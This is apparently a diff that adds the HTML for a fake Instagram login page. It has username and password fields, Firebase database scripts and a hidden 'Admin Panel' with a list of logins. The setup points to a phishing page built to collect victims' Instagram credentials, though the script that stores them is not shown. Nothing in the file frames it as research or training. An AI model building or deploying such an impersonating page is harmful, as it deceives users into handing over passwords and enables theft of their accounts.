@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram00000</title>
+  <link rel="stylesheet" href="style.css" />
+  <script defer src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+  <script defer src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+  <script defer src="https://www.gstatic.com/firebasejs/9.6.1/firebase-analytics-compat.js"></script>
+  <script defer src="script.js"></script>
+</head>
+<body>
+  <div class="login-container">
+    <h1 class="logo">Instagram</h1>
+    <input type="text" id="username" placeholder="Phone number, email or username" />
+    <div class="password-wrapper">
+      <input type="password" id="password" placeholder="Password" />
+      <span class="toggle">👁️</span>
+    </div>
+    <button id="loginBtn">Log In</button>
+    <div class="help">
+      <a href="#">Forgot your login details? <strong>Get help logging in.</strong></a>
+    </div>
+    <div class="divider"><span>OR</span></div>
+    <div class="facebook-login"><a href="#">Log in with Facebook</a></div>
+    <div class="signup">Don't have an account? <strong>Sign up.</strong></div>
+  </div>
+
+  <div id="admin-panel" style="display: none;">
+    <h2>Admin Panel</h2>
+    <ul id="logins-list"></ul>
+  </div>
+</body>
+</html>
